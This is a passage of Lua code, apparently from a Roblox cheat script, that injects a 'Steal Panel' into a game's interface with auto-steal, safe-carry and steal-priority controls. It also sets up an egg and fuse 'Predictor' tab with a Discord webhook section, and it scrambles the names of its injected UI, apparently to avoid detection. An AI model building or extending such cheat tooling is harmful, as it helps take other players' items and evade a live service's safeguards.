					if not snatcherPanelGui or not snatcherPanelGui.Parent then
						pcall(setupSnatcherUI)

						chilliState.UiDefer(function()
							if snatcherPanelGui and not isSnatcherActive then
								pcall(openSnatcherPanel, true)
							end
						end)

						return
					end

					if isSnatcherActive then
						closeSnatcherPanel(true, true)
					else
						openSnatcherPanel(true)
					end
				end)
			end)

			applyUiStrokes(clonedBtn)
			scrambleNames(clonedBtn)
			toggleButtonGui = createScreenGui(uiElementsCache.Hud)
			clonedBtn.Parent = toggleButtonGui
			toggleButtonGui.Parent = uiParent
			return true
		end

		local lastBtnPos = nil
		local lastBtnSize = nil

		local function updateToggleButtonPosition()
			local button = toggleButtonStruct and toggleButtonStruct.Button
			local eggs = uiElementsCache.Eggs
			local pets = uiElementsCache.Pets
			if not button or not eggs.Parent or not pets.Parent then
				return
			end

			if uiElementsCache.Hud.Enabled and uiElementsCache.GameHud.Visible and uiElementsCache.Column.Visible and eggs.Visible and pets.Visible and eggs.AbsoluteSize.X > 0 then
				local uiScale = eggs:FindFirstChildOfClass("UIScale")
				uiScale = uiScale and uiScale.Scale or 1

				if uiScale <= 0 then
					uiScale = 1
				end

				local eggsCenterPos = eggs.AbsolutePosition + eggs.AbsoluteSize / 2
				local eggsScaledSize = eggs.AbsoluteSize / uiScale
				local absolutePosition = toggleButtonGui.AbsolutePosition
				local buttonPosition = UDim2.fromOffset(eggsCenterPos.X - absolutePosition.X, eggsCenterPos.Y - (pets.AbsolutePosition + pets.AbsoluteSize / 2).Y - eggsCenterPos.Y - absolutePosition.Y)
				local buttonSize = UDim2.fromOffset(eggsScaledSize.X, eggsScaledSize.Y)

				if not isSnatcherActive then
					lastBtnPos = buttonPosition
					lastBtnSize = buttonSize
				end

				if button.Position ~= buttonPosition then
					button.Position = buttonPosition
				end

				if button.Size ~= buttonSize then
					button.Size = buttonSize
					triggerStrokeResize()
				end
			elseif not isSnatcherActive and lastBtnPos then
				if button.Position ~= lastBtnPos then
					button.Position = lastBtnPos
				end

				if lastBtnSize and button.Size ~= lastBtnSize then
					button.Size = lastBtnSize
					triggerStrokeResize()
				end
			end

			if button.Visible ~= true then
				button.Visible = true
			end
		end

		local function buildSnatcherPanel()
			local frame = uiElementsCache.ActivePets.Frame
			local snatcherFrame = cloneAndCleanInstance(frame)
			if not snatcherFrame then
				return false
			end
			local header = snatcherFrame:FindFirstChild("Header")
			local scrollingFrame = snatcherFrame:FindFirstChild("ScrollingFrame")
			local close = snatcherFrame:FindFirstChild("Close")
			local template = scrollingFrame and scrollingFrame:FindFirstChild("Template")
			local spacer = template and template:FindFirstChild("Spacer")
			local unequip = spacer and spacer:FindFirstChild("Unequip")
			local textLabel = spacer and spacer:FindFirstChild("TextLabel")
			if not (header and scrollingFrame and close and spacer and unequip and textLabel) then
				snatcherFrame:Destroy()
				return false
			end

			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child ~= template and child:IsA("GuiObject") and child.Name ~= "EmptyLast" then
					child:Destroy()
				end
			end

			local equipBest = snatcherFrame:FindFirstChild("EquipBest")

			if equipBest then
				equipBest:Destroy()
			end

			local uiAspectRatioConstraint = snatcherFrame:FindFirstChildOfClass("UIAspectRatioConstraint")
			local aspectRatio = uiAspectRatioConstraint and uiAspectRatioConstraint.AspectRatio or 1.25
			local isMobile = not UserInputService.MouseEnabled
			local mobileScaleMultiplier = isMobile and 1.2 or 1
			local mobileHeightScale = isMobile and 1.15 or 1
			local targetAspectRatio = panelTargetWidth / mobileHeightScale
			local aspectRatioAdjustment = targetAspectRatio / aspectRatio
			originalAspectRatio = { Width = frame.Size.X.Scale, Height = frame.Size.Y.Scale, Aspect = aspectRatio }
			snatcherFrame.Size = UDim2.new(panelBaseWidth * mobileScaleMultiplier, 0, panelBaseHeight * mobileScaleMultiplier * mobileHeightScale, 0)

			if not uiAspectRatioConstraint then
				uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Parent = snatcherFrame
			end

			uiAspectRatioConstraint.AspectRatio = targetAspectRatio
			uiAspectRatioConstraint.AspectType = Enum.AspectType.FitWithinMaxSize
			header.Size = UDim2.new(header.Size.X.Scale, header.Size.X.Offset, header.Size.Y.Scale * aspectRatioAdjustment, header.Size.Y.Offset)
			header.Position = UDim2.new(header.Position.X.Scale, header.Position.X.Offset, header.Position.Y.Scale * aspectRatioAdjustment, header.Position.Y.Offset)
			close.Size = UDim2.new(close.Size.X.Scale * 1, close.Size.X.Offset, close.Size.Y.Scale * aspectRatioAdjustment, close.Size.Y.Offset)
			close.Position = UDim2.new(close.Position.X.Scale * 1, close.Position.X.Offset, close.Position.Y.Scale, close.Position.Y.Offset)
			local scrollYScale = scrollingFrame.Size.Y.Scale
			local scrollYPosition = scrollingFrame.Position.Y.Scale
			local anchorY = scrollingFrame.AnchorPoint.Y
			local scrollTopAdjusted = (scrollYPosition - scrollYScale * anchorY) * aspectRatioAdjustment
			local scrollBottomAdjusted = 1 - (1 - scrollYPosition + scrollYScale * (1 - anchorY)) * aspectRatioAdjustment
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, scrollBottomAdjusted - scrollTopAdjusted, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, scrollTopAdjusted + (scrollBottomAdjusted - scrollTopAdjusted) * anchorY, 0)
			local frameYScale = scrollingFrame.Size.Y.Scale
			local frameAnchorY = scrollingFrame.AnchorPoint.Y
			local frameTopY = scrollingFrame.Position.Y.Scale - frameYScale * frameAnchorY
			local frameBottomY = frameTopY + frameYScale
			local controlsBarHeight = 0.1 * aspectRatioAdjustment
			local controlsBarMargin = 0.02 * aspectRatioAdjustment
			local controlsBarFrame = Instance.new("Frame")
			controlsBarFrame.BackgroundTransparency = 1
			controlsBarFrame.BorderSizePixel = 0
			controlsBarFrame.AnchorPoint = Vector2.new(0.5, 0)
			controlsBarFrame.Position = UDim2.new(0.5, 0, frameTopY + controlsBarMargin, 0)
			controlsBarFrame.Size = UDim2.new(0.9, 0, controlsBarHeight, 0)
			controlsBarFrame.Parent = snatcherFrame
			local scrollStartY = frameTopY + controlsBarMargin * 1.5 + controlsBarHeight
			scrollingFrame.Size = UDim2.new(scrollingFrame.Size.X.Scale, scrollingFrame.Size.X.Offset, frameBottomY - scrollStartY, 0)
			scrollingFrame.Position = UDim2.new(scrollingFrame.Position.X.Scale, scrollingFrame.Position.X.Offset, scrollStartY + (frameBottomY - scrollStartY) * frameAnchorY, 0)
			local clone = unequip:Clone()
			clone.AnchorPoint = Vector2.new(0, 0.5)
			clone.Position = UDim2.new(0, 0, 0.5, 0)
			clone.Size = UDim2.new(0.37, 0, 1, 0)
			clone.Parent = controlsBarFrame
			local toggleStruct = createButtonStruct(clone)
			bindButtonHover(toggleStruct)

			clone.Activated:Connect(function()
				local toggleState = autoStealToggle
				local hasSetMethod = autoStealToggle

				if toggleState then
					hasSetMethod = type(toggleState.Set) == "function"
				end

				if hasSetMethod then
					pcall(toggleState.Set, toggleState, not chilliState.Toggle(toggleState, false))
				end

				chilliState.UiDefer(updateAutoStealToggle)
			end)

			local clone2 = unequip:Clone()
			clone2.Parent = controlsBarFrame
			local guardStruct = createButtonStruct(clone2)
			bindButtonHover(guardStruct)

			clone2.Activated:Connect(function()
				local safeCarry = chilliState.SafeCarry
				local lineDrop = not safeCarry.LineDrop
				local instantHandle = safeCarry.InstantHandle

				if instantHandle and type(instantHandle.Set) == "function" then
					pcall(instantHandle.Set, instantHandle, lineDrop)
				end

				safeCarry.LineDrop = lineDrop
				chilliState.UiDefer(updateAutoStealToggle)
			end)

			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Padding = UDim.new(0.06, 0)
			uiListLayout.Parent = controlsBarFrame
			clone.Size = UDim2.new(0.46, 0, 1, 0)
			clone.LayoutOrder = 1
			clone2.Size = UDim2.new(0.46, 0, 1, 0)
			clone2.LayoutOrder = 2
			autoStealControls = { Toggle = toggleStruct, Guard = guardStruct }

			chilliState.StealPanelSync = function()
				chilliState.UiDefer(updateAutoStealToggle)
			end

			local uiGradient = header:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				local colorTbl = {}
				colorTbl[1] = { 0, color3(200, 18, 24) }
				colorTbl[2] = { 0.53, color3(255, 88, 90) }
				colorTbl[3] = { 1, color3(214, 28, 34) }
				uiGradient.Color = createColorSequence(colorTbl)
			end

			panelTitle = header:FindFirstChild("Title")
			updateTextLabel(panelTitle, "Steal Panel")
			local plusEquip = header:FindFirstChild("PlusEquip")
			sortToggleBtnStruct = createButtonStruct(plusEquip)

			if sortToggleBtnStruct then
				applyButtonStyle(sortToggleBtnStruct, stateThemes.Steal)
				updateTextLabel(sortToggleBtnStruct.Label, "Sort: " .. tostring(selectedSortPriority))
				bindButtonHover(sortToggleBtnStruct)
				local lastSortClick = 0

				local function toggleSortPriority()
					if os.clock() - lastSortClick < 0.25 then
						return
					end
					lastSortClick = os.clock()
					local nextSort = sortPriorityOptions[(table.find(sortPriorityOptions, selectedSortPriority) or 4) % #sortPriorityOptions + 1]
					local priorityHandle = chilliState.Steal.PriorityHandle

					if priorityHandle and type(priorityHandle.Set) == "function" then
						pcall(priorityHandle.Set, priorityHandle, nextSort)
					end

					if selectedSortPriority ~= nextSort then
						selectedSortPriority = nextSort

						if type(chilliState.ResortSteal) == "function" then
							chilliState.ResortSteal()
						end
					end

					chilliState.UiDefer(function()
						updateTextLabel(sortToggleBtnStruct.Label, "Sort: " .. tostring(selectedSortPriority))
						refreshEggList()
					end)
				end

				pcall(function()
					plusEquip.Active = true
					plusEquip.Interactable = true
					plusEquip.AutoButtonColor = true
				end)

				for _, descendant in ipairs(plusEquip:GetDescendants()) do
					if descendant:IsA("GuiObject") then
						pcall(function()
							descendant.Active = false
						end)
					end
				end

				plusEquip.Activated:Connect(toggleSortPriority)

				plusEquip.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						toggleSortPriority()
					end
				end)
			end

			local closeStruct = createButtonStruct(close)
			bindButtonHover(closeStruct)

			close.Activated:Connect(function()
				chilliState.UiDefer(function()
					closeSnatcherPanel(true, true)
				end)
			end)

			local clone3 = unequip:Clone()
			clone3.Name = "Cancel"
			clone3.Parent = spacer
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.DominantAxis = Enum.DominantAxis.Height
			uiAspectRatioConstraint2.Parent = clone3
			unequip.Size = UDim2.new(0.24, 0, unequip.Size.Y.Scale, 0)
			unequip.Position = UDim2.new(0.852, 0, 0.5, 0)
			clone3.Size = UDim2.new(0.105, 0, unequip.Size.Y.Scale, 0)
			clone3.Position = UDim2.new(0.965, 0, 0.5, 0)
			local icon = spacer:FindFirstChild("Icon")

			if icon then
				icon.AnchorPoint = Vector2.new(0.5, 0.5)
				icon.Size = UDim2.new(0.2, 0, 1.3, 0)
				icon.Position = UDim2.new(0.1, 0, 0.5, 0)
			end

			textLabel.AnchorPoint = Vector2.new(textLabel.AnchorPoint.X, 0.5)
			textLabel.Size = UDim2.new(0.38, 0, 0.3, 0)
			textLabel.Position = UDim2.new(0.415, 0, 0.2, 0)
			updateTextLabel(textLabel, "")
			local clone4 = textLabel:Clone()
			clone4.Name = "Value"
			clone4.Size = UDim2.new(0.38, 0, 0.23, 0)
			clone4.Position = UDim2.new(0.415, 0, 0.48, 0)
			local uiGradient2 = clone4:FindFirstChildOfClass("UIGradient")

			if not uiGradient2 then
				uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Parent = clone4
			end

			uiGradient2.Color = stateThemes.Steal.Color
			uiGradient2.Rotation = stateThemes.Steal.Rotation
			clone4.Parent = spacer
			local clone5 = clone4:Clone()
			clone5.Name = "Detail"
			clone5.Size = UDim2.new(0.4, 0, 0.3, 0)
			clone5.Position = UDim2.new(0.415, 0, 0.78, 0)
			local uiGradient3 = clone5:FindFirstChildOfClass("UIGradient")

			if uiGradient3 then
				uiGradient3.Color = stateThemes.Hud.Color
				uiGradient3.Rotation = stateThemes.Hud.Rotation
			end

			clone5.Parent = spacer
			local stealButtonStruct = createButtonStruct(unequip)
			updateTextLabel(stealButtonStruct.Label, "Steal")
			applyButtonStyle(stealButtonStruct, stateThemes.Steal)
			local cancelButtonStruct = createButtonStruct(clone3)
			updateTextLabel(cancelButtonStruct.Label, "X")
			applyButtonStyle(cancelButtonStruct, stateThemes.Cancel)
			clone3.Position = panelSizeFullscreen
			clone3.Visible = false
			unequip.Position = panelSizeReduced
			unequip.Size = panelSizeSmall
			local clone6 = clone3:Clone()
			clone6.Name = "Star"
			clone6.AnchorPoint = Vector2.new(1, 0.5)
			clone6.Size = UDim2.new(0.1, 0, 0.56, 0)
			clone6.Position = panelSizeFullscreen
			clone6.Visible = true
			clone6.Parent = spacer
			local starButtonStruct = createButtonStruct(clone6)
			updateTextLabel(starButtonStruct.Label, utf8.char(9733))
			applyButtonStyle(starButtonStruct, stateThemes.Queued)
			local arrowButtons = {}
			local upButtonConfig = {}
			local upArrowChar = utf8.char(9650)
			local upButtonXPos = panelScaleReduced - panelWidthReduction
			upButtonConfig[1] = "Up"
			upButtonConfig[2] = upArrowChar
			upButtonConfig[3] = upButtonXPos
			local downButtonConfig = {}
			local downArrowChar = utf8.char(9660)
			downButtonConfig[1] = "Down"
			downButtonConfig[2] = downArrowChar
			downButtonConfig[3] = panelScaleReduced
			arrowButtons[1] = upButtonConfig
			arrowButtons[2] = downButtonConfig

			for _, buttonConfig in ipairs(arrowButtons) do
				local clone7 = clone3:Clone()
				clone7.Name = buttonConfig[1]
				clone7.AnchorPoint = Vector2.new(1, 0.5)
				clone7.Size = UDim2.new(0.1, 0, 0.56, 0)
				clone7.Position = UDim2.new(buttonConfig[3], 0, 0.6, 0)
				clone7.Visible = false
				clone7.Parent = spacer
				local arrowButtonStruct = createButtonStruct(clone7)
				updateTextLabel(arrowButtonStruct.Label, buttonConfig[2])
				applyButtonStyle(arrowButtonStruct, stateThemes.Hud)
			end

			clone3.AnchorPoint = Vector2.new(1, 0)
			clone3.Position = UDim2.new(0.99, 0, 0.04, 0)
			clone3.Size = UDim2.new(0.06, 0, 0.28, 0)
			clone3.ZIndex = 8

			for _, descendant in ipairs(clone3:GetDescendants()) do
				if descendant:IsA("GuiObject") then
					descendant.ZIndex = descendant.ZIndex + 8
				end
			end

			local clone7 = clone4:Clone()
			clone7.Name = "Rank"
			clone7.AnchorPoint = Vector2.new(0, 0)
			clone7.Position = UDim2.new(0.012, 0, 0.03, 0)
			clone7.Size = UDim2.new(0.1, 0, 0.36, 0)
			clone7.TextXAlignment = Enum.TextXAlignment.Left
			clone7.ZIndex = 6
			clone7.Visible = false
			updateTextLabel(clone7, "#1")
			local uiGradient4 = clone7:FindFirstChildOfClass("UIGradient")

			if uiGradient4 then
				uiGradient4.Color = stateThemes.PriorityOn.Color
				uiGradient4.Rotation = 90
			end

			clone7.Parent = spacer
			template.Visible = false
			template.Parent = nil
			eggEntryTemplate = template
			eggListContainer = scrollingFrame
			snatcherPanelFrame = snatcherFrame
			snatcherPanelPosition = frame.Position
			snatcherFrame.Position = snatcherPanelPosition
			applyUiStrokes(snatcherFrame, true)
			scrambleNames(snatcherFrame)
			snatcherPanelGui = createScreenGui(uiElementsCache.ActivePets)
			snatcherPanelGui.Enabled = false
			snatcherFrame.Parent = snatcherPanelGui
			snatcherPanelGui.Parent = uiParent
			table.insert(uiConnections, scrollingFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateEggEntryHeight))
			table.insert(uiConnections, snatcherFrame:GetPropertyChangedSignal("AbsoluteSize"):Connect(triggerStrokeResize))
			return true
		end

		local function teardownSnatcherUI()
			if not isPanelInitialized then
				return
			end
			isPanelInitialized = false
			panelUpdateTimer += 1
			isEggUpdateScheduled = false
			isEggUpdatePending = false

			if isSnatcherActive then
				isSnatcherActive = false

				if not isAnyMenuOpen() then
					animateGameHudColumn(false, true)
				end
			end

			if panelTween then
				panelTween:Cancel()
				panelTween = nil
			end

			drawingTheme.DisconnectAll(uiConnections)
			table.clear(eggEntryPool)
			table.clear(queuedEggsList)

			if snatcherPanelGui then
				snatcherPanelGui:Destroy()
			end

			if eggEntryTemplate then
				eggEntryTemplate:Destroy()
			end

			snatcherPanelGui = nil
			snatcherPanelFrame = nil
			snatcherPanelPosition = nil
			panelTitle = nil
			sortToggleBtnStruct = nil
			eggListContainer = nil
			eggEntryTemplate = nil
			eggEntryHeight = 0
			autoStealControls = nil
			originalAspectRatio = nil
			eggEntryCount = 1
			uiElementsCache = nil
		end

		setupSnatcherUI = function()
			if isPanelInitialized then
				return
			end
			local uiElements = findGameUIElements()

			if not uiElements then
				if not isPanelVisible then
					isPanelVisible = true

					task.delay(2, function()
						isPanelVisible = false

						if not isPanelInitialized and chilliState.Toggle(nil, true) then
							setupSnatcherUI()
						end
					end)
				end

				return
			end

			uiElementsCache = uiElements
			isPanelInitialized = true
			panelUpdateTimer += 1
			local currentPanelTimer = panelUpdateTimer
			uiStroke = uiElementsCache.ActivePets.Frame:FindFirstChildOfClass("UIStroke")
			thickness = uiStroke and uiStroke.Thickness or nil
			baseResolutions.Panel = thickness or 2.3120369911193848
			local uiStrokeClr = uiElementsCache.Pets:FindFirstChild("UIStrokeClr")
			baseResolutions.Hud = uiStrokeClr and uiStrokeClr:IsA("UIStroke") and uiStrokeClr.Thickness or 2.3120369911193848
			if not initializeSnatcherToggleButton() or not buildSnatcherPanel() then
				teardownSnatcherUI()
				return
			end

			if shouldStartPerformanceMonitor then
				shouldStartPerformanceMonitor = false
				task.spawn(startPerformanceMonitor)
			end

			table.insert(uiConnections, RunService.RenderStepped:Connect(updateToggleButtonPosition))

			if uiStroke then
				table.insert(uiConnections, uiStroke:GetPropertyChangedSignal("Thickness"):Connect(triggerStrokeResize))
			end

			for _, menuInstance in ipairs({ uiElementsCache.ActivePets, uiElementsCache.GrowingEggs }) do
				if menuInstance then
					table.insert(uiConnections, menuInstance:GetPropertyChangedSignal("Enabled"):Connect(function()
						if menuInstance.Enabled and isSnatcherActive then
							closeSnatcherPanel(false)
						end
					end))
				end
			end

			local eggState = gameModules.EggState

			if type(eggState) == "table" then
				for _, eventName in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
					local eventSignal = eggState[eventName]

					if type(eventSignal) == "table" and type(eventSignal.Connect) == "function" then
						local ok, result = pcall(eventSignal.Connect, eventSignal, triggerNextEggUpdate)

						if ok and result then
							table.insert(uiConnections, result)
						end
					end
				end
			end

			local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

			if areaEggSlotsClient then
				table.insert(uiConnections, areaEggSlotsClient.ChildAdded:Connect(triggerNextEggUpdate))
				table.insert(uiConnections, areaEggSlotsClient.ChildRemoved:Connect(triggerNextEggUpdate))
			end

			task.spawn(function()
				local elapsedTime = 0

				while true do
					if isPanelInitialized and currentPanelTimer == panelUpdateTimer then
						elapsedTime += task.wait(0.5)

						if not (not isPanelInitialized or currentPanelTimer ~= panelUpdateTimer) then
							if not (uiElementsCache.Eggs:IsDescendantOf(game) and uiElementsCache.ActivePets:IsDescendantOf(game)) then
								task.defer(function()
									teardownSnatcherUI()

									if chilliState.Toggle(nil, true) then
										setupSnatcherUI()
									end
								end)

								break
							else
								if elapsedTime >= 3 then
									triggerNextEggUpdate()
									elapsedTime = 0
								elseif isSnatcherActive then
									refreshEggList()
								end

								continue
							end
						end
					end

					break
				end
			end)

			task.spawn(pcall, throttledProcessFieldEggs, currentPanelTimer)
		end

		trackCleanup(function()
			teardownSnatcherUI()

			if toggleButtonGui then
				toggleButtonGui:Destroy()
			end

			animateButtonGradient(nil)
			toggleButtonGui = nil
			toggleButtonStruct = nil
			panelBackgroundImage = nil
		end)

		chilliState.RestoreStealPanel = function()
			if stealPanelToggleState:Get() ~= true then
				return
			end

			if isPanelInitialized and snatcherPanelGui and not isSnatcherActive then
				task.spawn(openSnatcherPanel)
			else
				panelAnimating = true
			end
		end
	end

	task.defer(setupSnatcherUI)

	do
		-- ══════════════════════════════════════════════════════════════════════════
		-- 🔮 [SECTION 3] PREDICTOR TAB - EGG PREDICTOR & FUSE PREDICTOR
		-- ══════════════════════════════════════════════════════════════════════════
		local predictorTab = hubWindow:CreateTab({ Name = "Predictor", SectionsExpanded = true })
		discordWebhookSection = predictorTab:CreateSection({ Name = "Discord Webhook", Expanded = false })
		eggPredictorSection = predictorTab:CreateSection({ Name = "Egg Predictor", Expanded = true })
		fusePredictorSection = predictorTab:CreateSection({ Name = "Fuse Predictor", Expanded = false })

		local function createFont(fontAssetPath, fontWeight)
			local ok, result = pcall(Font.new, fontAssetPath, fontWeight, Enum.FontStyle.Normal)
			return ok and result or nil
		end

		eggPredictorHelper = {
			Ready = type(eggPredictorSection.CreateCanvas) == "function",
			Bullet = utf8.char(8226),
			Color = {
				Text = "#FFFFFF",
				Income = "#4DFF7A",
				Clock = "#FFC24D",
				Ready = "#4DFF7A",
				Growing = "#FFC24D",
				Inventory = "#7FD8FF",
				Weight = "#CDE7FF",
				Scale = "#FFDF8A",
				Separator = "#7A8CC0",
				Hint = "#9FB8FF",
			},
			NameFont = createFont("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		}

		eggPredictorHelper.RarityFont = createFont("rbxassetid://12187365977", Enum.FontWeight.Bold) or createFont("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular)
		local sequence2 = drawingTheme.Sequence
		local nameGradientKeypoints = {
			{ 0, Color3.fromRGB(255, 255, 255) },
			{ 0.5, Color3.fromRGB(222, 238, 255) },
			{ 1, Color3.fromRGB(255, 255, 255) },
		}
		eggPredictorHelper.NameGradient = sequence2(nameGradientKeypoints)
		local sequence3 = drawingTheme.Sequence
		local secretGradientKeypoints = {
			{ 0, Color3.fromRGB(255, 255, 255) },
			{ 0.2, Color3.fromRGB(206, 212, 224) },
			{ 0.42, Color3.fromRGB(74, 80, 94) },
			{ 0.58, Color3.fromRGB(42, 46, 56) },
			{ 0.78, Color3.fromRGB(158, 166, 182) },
			{ 1, Color3.fromRGB(250, 252, 255) },
		}
		eggPredictorHelper.SecretGradient = sequence3(secretGradientKeypoints)
		eggPredictorHelper.SecretRotation = 90

		eggPredictorHelper.Paint = function(colorHex, text)
			return string.format("<font color=\"%s\">%s</font>", colorHex, text)
		end

		eggPredictorHelper.Bold = function(text)
			return "<b>" .. tostring(text) .. "</b>"
		end

		eggPredictorHelper.Escape = function(text)
			return (string.gsub(tostring(text), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
		end

		eggPredictorHelper.Separator = function()
			return eggPredictorHelper.Paint(eggPredictorHelper.Color.Separator, "  " .. eggPredictorHelper.Bullet .. "  ")
		end

		eggPredictorHelper.FormatRate = function(rateValue)
			local rateNum = tonumber(rateValue) or 0
			if rateNum >= 1e12 then
				return string.format("%.2fT/s", rateNum / 1e12)
			end

			if rateNum >= 1e9 then
				return string.format("%.2fB/s", rateNum / 1e9)
			end

			if rateNum >= 1000000 then
				return string.format("%.2fM/s", rateNum / 1000000)
			end

			if rateNum >= 1000 then
				return string.format("%.1fK/s", rateNum / 1000)
			end
			return string.format("%d/s", math.floor(rateNum))
		end

		eggPredictorHelper.FormatWeight = function(weightValue)
			local weightNum = tonumber(weightValue) or 0
			local str = weightNum >= 1000 and string.format("%.0f", weightNum) or string.format("%.2f", weightNum)
			local integerPart, decimalPart = string.match(str, "^(%-?%d+)(%.%d+)$")
			integerPart = integerPart or str
			local formattedInteger

			while true do
				local replacedCount
				formattedInteger, replacedCount = string.gsub(integerPart, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if replacedCount ~= 0 then
					integerPart = formattedInteger
				else
					break
				end
			end

			return formattedInteger .. (decimalPart or "") .. " Kg"
		end

		eggPredictorHelper.FormatClock = function(totalSeconds)
			local secondsNum = math.max(0, math.floor(tonumber(totalSeconds) or 0))
			return string.format("%02dh %02dm %02ds", math.floor(secondsNum / 3600), math.floor(secondsNum % 3600 / 60), secondsNum % 60)
		end

		eggPredictorHelper.ScaleFactor = function(scaleValue)
			if scaleValue > 5 then
				return (scaleValue / 5) ^ 1.2 * 19.637875755794113
			end
			return scaleValue ^ 1.85
		end

		eggPredictorHelper.MutationMultiplier = function(mutationsList)
			mutationsList = type(mutationsList) == "table" and mutationsList or {}
			local mutations = gameModules.Mutations

			if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
				local ok, result = pcall(mutations.EarningsFor, mutationsList)
				if ok and type(result) == "number" then
					return result
				end
			end

			return 1
		end

		local mutationColors = {
			Golden = "#FFD34D",
			Silver = "#E6EEF7",
			Sakura = "#FF9ED8",
			GreatBloom = "#7CFFC4",
			Boss = "#FF7A7A",
			Monstrous = "#C08BFF",
		}

		local rainbowColors = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }

		eggPredictorHelper.MutationText = function(mutationsList)
			local formattedParts = {}

			if type(mutationsList) == "table" then
				for _, mutationName in ipairs(mutationsList) do
					local mutationDisplayName = string.upper(getAreaDisplayName(mutationName))

					if mutationName == "Rainbow" or mutationName == "Prismatic" then
						local charSpans = {}

						for i = 1, #mutationDisplayName do
							table.insert(charSpans, eggPredictorHelper.Paint(rainbowColors[(i - 1) % #rainbowColors + 1], string.sub(mutationDisplayName, i, i)))
						end

						table.insert(formattedParts, eggPredictorHelper.Bold(table.concat(charSpans)))
					else
						table.insert(formattedParts, eggPredictorHelper.Bold(eggPredictorHelper.Paint(mutationColors[mutationName] or "#8FE3FF", eggPredictorHelper.Escape(mutationDisplayName))))
					end
				end
			end

			return table.concat(formattedParts, " ")
		end

		local rarityGradients = nil

		local function getRarityGradientInstance(rarityData)
			if type(rarityData) == "table" and typeof(rarityData.RarityGradient) == "Instance" then
				return rarityData.RarityGradient
			end

			if rarityGradients == nil then
				local assets = ReplicatedStorage:FindFirstChild("Assets")
				assets = assets and assets:FindFirstChild("UI")
				rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
			end

			if not rarityGradients or type(rarityData) ~= "table" then
				return nil
			end
			local rarityFolder = rarityGradients:FindFirstChild(tostring(rarityData._id or rarityData.DisplayName or ""))
			return rarityFolder and rarityFolder:FindFirstChild("RarityGradient") or nil
		end

		local assetInfoCache = {}

		eggPredictorHelper.AssetInfo = function(assetCategory)
			local categoryStr = tostring(assetCategory)
			local cached = assetInfoCache[categoryStr]
			if cached then
				return cached
			end
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local assetEntry = type(directory) == "table" and directory[categoryStr] or nil

			if assetEntry == nil and type(directory) == "table" then
				local normalizedCategory = string.gsub(string.lower(categoryStr), "[^%a%d]", "")

				for k, entry in pairs(directory) do
					if type(entry) == "table" then
						local candidateNames = {}
						local keyStr = tostring(k)
						local idStr = tostring(entry._id or "")
						local tostringFn = tostring
						local displayName = entry.DisplayName or ""
						local packedName = table.pack(tostringFn(displayName))
						candidateNames[1] = keyStr
						candidateNames[2] = idStr

						do
							local values = table.pack(table.unpack(packedName, 1, packedName.n))
							table.move(values, 1, values.n, 3, candidateNames)
						end

						local eggModel = type(entry.Egg) == "table" and entry.Egg or nil

						if eggModel ~= nil then
							candidateNames[#candidateNames + 1] = tostring(eggModel.ModelName or "")
						end

						for _, nameCandidate in ipairs(candidateNames) do
							if nameCandidate ~= "" and string.gsub(string.lower(nameCandidate), "[^%a%d]", "") == normalizedCategory then
								assetEntry = entry
								break
							end
						end
					end

					if assetEntry == nil then
						continue
					end
					break
				end
			end

			local rarity = type(assetEntry) == "table" and type(assetEntry.Rarity) == "table" and assetEntry.Rarity or nil
			local icon = type(assetEntry) == "table" and assetEntry.Icon or nil
			local rarityDisplayName

			if rarity then
				rarityDisplayName = tostring(rarity.DisplayName or rarity._id or "Common")
			else
				rarityDisplayName = rarity
			end

			rarityDisplayName = rarityDisplayName or "Common"
			local rarityColor = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
			local assetResult = {}
			local assetName = type(assetEntry) == "table"

			if assetName then
				assetName = tostring(assetEntry.DisplayName or categoryStr)
			end

			assetResult.Name = assetName or categoryStr
			assetResult.Category = categoryStr
			assetResult.Rarity = rarityDisplayName
			local rarityRank

			if rarity then
				rarityRank = tonumber(rarity.RarityNumber or rarity.Rank)
			else
				rarityRank = rarity
			end

			assetResult.RarityNumber = rarityRank or 0
			assetResult.Color = rarityColor
			assetResult.Hex = "#" .. string.upper(rarityColor:ToHex())
			assetResult.Gradient = getRarityGradientInstance(rarity)
			assetResult.EarningRate = type(assetEntry) == "table" and tonumber(assetEntry.EarningRate) or 0
			assetResult.Icon = type(icon) == "string" and icon ~= "" and icon or nil
			assetInfoCache[categoryStr] = assetResult
			return assetResult
		end

		eggPredictorHelper.Income = function(assetInfo, scaleValue, mutationsList)
			if type(scaleValue) ~= "number" or scaleValue <= 0 then
				return 0
			end
			return math.max(math.round(assetInfo.EarningRate * eggPredictorHelper.ScaleFactor(scaleValue) * eggPredictorHelper.MutationMultiplier(mutationsList)), 1)
		end

		local function isShown(guiInstance)
			if typeof(guiInstance) ~= "Instance" or not guiInstance:IsDescendantOf(game) then
				return false
			end

			while guiInstance do
